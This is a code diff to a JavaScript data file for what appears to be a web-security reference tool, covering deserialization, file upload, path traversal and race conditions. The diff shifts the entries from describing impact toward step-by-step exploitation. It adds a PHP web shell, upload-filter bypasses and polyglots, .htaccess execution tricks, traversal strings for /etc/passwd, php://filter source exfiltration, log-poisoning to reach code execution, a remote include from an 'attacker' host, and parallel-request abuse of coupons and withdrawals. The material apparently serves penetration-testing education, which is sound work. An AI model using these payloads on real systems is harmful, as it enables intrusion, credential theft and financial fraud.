+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Remote code execution", "The headline outcome with a working gadget chain"],
-              ["Auth/logic bypass", "Tamper serialized fields (roles, flags) even without RCE"],
-              ["Denial of service", "Object graphs that exhaust CPU/memory on load"],
-              ["Full compromise", "RCE as the app process, then internal pivoting"]
+              ["ysoserial", "Generate Java deserialization gadget payloads"],
+              ["ysoserial.net", ".NET ViewState / deserialization payloads"],
+              ["Burp (+ Collaborator)", "Detect blobs and confirm via OOB callbacks"],
+              ["phpggc", "Generate PHP object-injection gadget chains"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Insecure deserialization", url: "https://portswigger.net/web-security/deserialization" },
+              { label: "OWASP — Deserialization Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" }
             ]
           },
           {
@@ -1407,7 +1543,7 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
         description: "Weak upload validation lets an attacker place executable or malicious files on the server.",
-        brief: "File upload becomes dangerous when the application does not properly restrict what can be uploaded and where it lands. If an attacker can upload a server-executable file (a web shell) into a web-accessible, executable directory, the result is remote code execution. Even without execution, weak handling enables stored XSS (SVG/HTML), path traversal, and denial of service.\n\nThe common failures are trusting the client-supplied filename or Content-Type, checking only the extension, and storing uploads under the web root where they can be requested and run.",
+        brief: "File upload becomes dangerous when the application does not properly restrict what can be uploaded and where it lands. If an attacker can upload a server-executable file (a web shell) into a web-accessible, executable directory, the result is remote code execution. Even without execution, weak handling enables stored XSS (SVG/HTML), path traversal, and denial of service.\n\nImpact: RCE via web shell, stored XSS, and file overwrite. The common failures are trusting the client-supplied filename or Content-Type, checking only the extension, and storing uploads under the web root where they can be requested and run.",
         quickReference: [
           { label: "Web shell (PHP)", cmd: "shell.php  ->  <?php system($_GET['c']); ?>" },
           { label: "Extension bypasses", cmd: "shell.php.jpg   shell.pHp   shell.phtml   shell.php%00.jpg   double extension" },
@@ -1415,6 +1551,17 @@ var VULNS = [
           { label: "Non-RCE impact", cmd: "malicious.svg (stored XSS), ../../ in filename (path traversal)" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Upload a benign file and locate it", cmd: "# upload test.jpg, then find where it is served:\nGET /uploads/test.jpg\n# is the path predictable and web-accessible? does the dir execute scripts?" },
+              { label: "2. Try a web shell straight up", cmd: "# shell.php:\n<?php system($_GET['c']); ?>\n# if accepted and executable:\nGET /uploads/shell.php?c=id   -> command output = RCE" },
+              { label: "3. Bypass extension / type filters", cmd: "shell.php.jpg        # double extension\nshell.phtml / .php5  # alternate exec extensions\nshell.pHp            # case\nContent-Type: image/png   # forged MIME with a PHP body\nGIF89a;<?php system($_GET['c']);?>   # magic-byte polyglot" },
+              { label: "4. Enable execution via config upload", cmd: "# where scripts don't run, upload a handler config to turn them on:\n# Apache:  .htaccess  ->  AddType application/x-httpd-php .jpg\n# IIS:     web.config with a handler mapping\n# then upload the payload with the now-executable extension" },
+              { label: "5. Non-RCE impact when exec is impossible", cmd: "# stored XSS via an inline-served SVG/HTML:\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n# path traversal in the filename to overwrite outside the dir:\nfilename=\"../../var/www/html/index.php\"" }
+            ]
+          },
           {
             title: "Validation Bypasses",
             type: "table",
@@ -1428,25 +1575,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Upload a benign test", "Learn where files land and whether the path is predictable and web-accessible"],
-              ["Probe execution", "Try to get a server-side script to execute at its stored URL"],
-              ["Bypass filters", "Iterate extensions, Content-Type, and magic bytes"],
-              ["Try non-exec impact", "SVG/HTML for stored XSS; traversal in the filename"]
+              ["1", "Upload a benign file, find its URL", "Storage path + exec behaviour"],
+              ["2", "Bypass validation with a web shell", "Server-side script stored"],
+              ["3", "Request the shell URL", "RCE as the web user"],
+              ["4", "Or serve SVG/HTML inline", "Stored XSS fallback"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Remote code execution", "Web shell executes on the server"],
-              ["Stored XSS", "SVG/HTML served inline runs script in viewers' browsers"],
-              ["Path traversal / overwrite", "Write files outside the upload directory"],
-              ["Denial of service", "Huge files or decompression bombs exhaust resources"]
+              ["Burp Suite", "Manipulate filename, Content-Type, and magic bytes"],
+              ["fuxploider", "Automated upload-filter fuzzing and bypass discovery"],
+              ["weevely", "Generate stealthy PHP web shells"],
+              ["exiftool", "Embed payloads into image metadata for polyglots"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Unrestricted File Upload", url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" },
+              { label: "OWASP — File Upload Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" }
             ]
           },
           {
@@ -1468,7 +1623,7 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/file-path-traversal",
         description: "User input in a file path escapes the intended directory to read (or include and execute) arbitrary files.",
-        brief: "Path traversal (directory traversal) occurs when user input is used to build a filesystem path without proper validation, letting an attacker use ../ sequences to reach files outside the intended directory. When the file is merely read, it is Local File Inclusion — leaking source code, config, and secrets. When the platform executes included files (classically PHP), it becomes Local or Remote File Inclusion and can reach code execution.\n\nThe defect is trusting user input to name a file; the fix is to never build a path from raw input.",
+        brief: "Path traversal (directory traversal) occurs when user input is used to build a filesystem path without proper validation, letting an attacker use ../ sequences to reach files outside the intended directory. When the file is merely read, it is Local File Inclusion — leaking source, config, and secrets. When the platform executes included files (classically PHP), it becomes LFI/RFI and can reach code execution.\n\nImpact: source and secret disclosure, credential theft from config, and RCE where controllable content can be included. The defect is trusting user input to name a file; the fix is to never build a path from raw input.",
         quickReference: [
           { label: "Basic traversal", cmd: "?file=../../../../etc/passwd   ?page=..\\..\\windows\\win.ini" },
           { label: "Encoding bypasses", cmd: "%2e%2e%2f   ..%252f (double)   ....//   %c0%ae (overlong)" },
@@ -1477,15 +1632,14 @@ var VULNS = [
         ],
         sections: [
           {
-            title: "Bypasses",
-            type: "table",
-            columns: ["Defence", "Bypass"],
-            rows: [
-              ["Strips ../", "Nested ....// so one removal leaves ../ ; or absolute path /etc/passwd"],
-              ["URL-decodes once", "Double-encode: ..%252f"],
-              ["Requires an extension", "Null byte %00 (legacy), or a php://filter wrapper to still read"],
-              ["Allow-list a prefix", "Start with the allowed prefix, then traverse out of it"],
-              ["Blocks encodings", "Overlong UTF-8 (%c0%ae) on some stacks"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Read a file outside the directory", cmd: "?file=../../../../etc/passwd            # Linux\n?page=..\\..\\..\\windows\\win.ini         # Windows\n# a leaked /etc/passwd or win.ini confirms traversal" },
+              { label: "2. Defeat filters", cmd: "?file=..%2f..%2fetc%2fpasswd            # url-encoded\n?file=..%252f..%252fetc%252fpasswd      # double-encoded (decoded twice)\n?file=....//....//etc/passwd            # nested -> one strip leaves ../\n?file=/etc/passwd                       # absolute path if prefix not required" },
+              { label: "3. Exfiltrate source with php://filter", cmd: "?file=php://filter/convert.base64-encode/resource=index.php\n# returns base64 of the source (config, DB creds) without executing it\nbase64 -d <<< '<returned blob>'" },
+              { label: "4. LFI -> RCE via a controllable file", cmd: "# include a file whose contents you control:\n?file=/var/log/apache2/access.log       # after poisoning UA: <?php system($_GET['c']);?>\n?file=/proc/self/environ                # poison via User-Agent\n?file=php://input   (POST body = <?php ... ?>)   data:// wrapper" },
+              { label: "5. RFI where remote include is enabled", cmd: "# rare by default (allow_url_include=On):\n?file=http://attacker/shell.txt         # direct remote code execution" }
             ]
           },
           {
@@ -1500,14 +1654,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Source/secret disclosure", "Read application source, .env, config, private keys"],
-              ["Credential theft", "DB creds and API keys from config files"],
-              ["Remote code execution", "Via inclusion of controllable content (LFI->RCE, RFI)"],
-              ["Further recon", "Read /etc/passwd, process env, and internal paths"]
+              ["1", "Inject ../ into a file parameter", "Read outside the base dir"],
+              ["2", "Bypass encoding/strip filters", "Reliable arbitrary file read"],
+              ["3", "Exfiltrate source/secrets (php://filter)", "Config + credential disclosure"],
+              ["4", "Include controllable content", "LFI -> RCE"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite", "Manual traversal, encoding, and wrapper testing"],
+              ["ffuf / LFISuite", "Fuzz path parameters and known LFI targets"],
+              ["dotdotpwn", "Automated traversal fuzzer across encodings"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — File path traversal", url: "https://portswigger.net/web-security/file-path-traversal" },
+              { label: "PayloadsAllTheThings — File Inclusion / Path Traversal", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" }
             ]
           },
           {
@@ -1529,7 +1701,7 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/race-conditions",
         description: "Concurrent requests hit a check-then-act window, letting a limited action happen more times than allowed.",
-        brief: "A race condition (TOCTOU — time-of-check to time-of-use) exists when an application checks a condition and then acts on it non-atomically, so two requests sent close together both pass the check before either completes the action. The result is a limit enforced once being applied many times: a gift card redeemed twice, a single-use coupon reused, a withdrawal exceeding the balance.\n\nModern tooling (Burp's single-packet attack / Turbo Intruder) makes these windows exploitable even when they are only microseconds wide.",
+        brief: "A race condition (TOCTOU — time-of-check to time-of-use) exists when an application checks a condition and then acts on it non-atomically, so two requests sent close together both pass the check before either completes the action. The result is a limit enforced once being applied many times: a gift card redeemed twice, a single-use coupon reused, a withdrawal exceeding the balance.\n\nImpact: financial loss, limit and single-use bypass, and inconsistent data. Modern tooling (Burp's single-packet attack / Turbo Intruder) makes these windows exploitable even when they are only microseconds wide.",
         quickReference: [
           { label: "The idea", cmd: "Send N identical requests simultaneously to beat a check-then-act gap" },
           { label: "Tooling", cmd: "Burp Repeater 'Send group in parallel' (single-packet attack); Turbo Intruder" },
@@ -1537,6 +1709,17 @@ var VULNS = [
           { label: "Signal", cmd: "The action succeeds more times than the limit should allow" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Identify a limited, valuable action", cmd: "# anything with a 'once' or a cap tied to money/entitlement:\nPOST /giftcard/redeem   code=ABC        # single-use\nPOST /account/withdraw  amount=100       # balance-checked\nPOST /coupon/apply      code=WELCOME10   # one per account" },
+              { label: "2. Stage identical requests as a group", cmd: "# Burp: send the request to Repeater, duplicate the tab N times,\n# add all tabs to a group, then 'Send group in parallel (single-packet attack)'\n# this lands ~20 requests within the same server-side window" },
+              { label: "3. Or use Turbo Intruder for precision", cmd: "# engine.queue with 100% gate to release all requests together:\n#   for i in range(20): engine.queue(target.req)\n#   engine.openGate()  # fire simultaneously\n# tune concurrency to widen the successful window" },
+              { label: "4. Compare against the baseline", cmd: "# did the benefit apply more times than allowed?\n# balance credited twice, coupon accepted 5x, two accounts with the same username\n# more successes than the limit = exploitable race" },
+              { label: "5. Weaponise / quantify impact", cmd: "# repeat to establish reliability and magnitude (e.g. Nx over-redemption)\n# report the count and monetary impact; stop at a clear proof" }
+            ]
+          },
           {
             title: "Vulnerable Patterns",
             type: "table",
@@ -1549,25 +1732,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Finding It",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Identify limited actions", "Anything with a 'once' or a cap tied to money or entitlement"],
-              ["Send in parallel", "Use the single-packet attack to land requests within the same window"],
-              ["Compare to baseline", "Did the benefit apply more times than allowed?"],
-              ["Tune concurrency", "Vary the number of parallel requests and timing"]
+              ["1", "Find a capped/single-use action", "Candidate TOCTOU window"],
+              ["2", "Fire N requests in parallel", "Multiple pass the check"],
+              ["3", "Compare to the allowed limit", "Limit applied many times"],
+              ["4", "Repeat for magnitude", "Quantified financial impact"]
             ]
           },
           {
-            title: "Impact",
+            title: "Tools Used",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Tool", "Purpose"],
             rows: [
-              ["Financial loss", "Multi-redeem credits, over-limit withdrawals, duplicated refunds"],
-              ["Limit bypass", "Exceed per-user caps and single-use restrictions"],
-              ["Data inconsistency", "Duplicate records or impossible states"],
-              ["Fraud at scale", "Automated abuse of coupons/referrals"]
+              ["Burp Suite (single-packet attack)", "Land many requests in one server-side window"],
+              ["Turbo Intruder", "Scripted, gated high-precision concurrency"],
+              ["custom async scripts", "Reproduce parallel request bursts"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "PortSwigger — Race conditions", url: "https://portswigger.net/web-security/race-conditions" },
+              { label: "PortSwigger — Smashing the state machine (single-packet attack)", url: "https://portswigger.net/research/smashing-the-state-machine" }
             ]
           },
           {
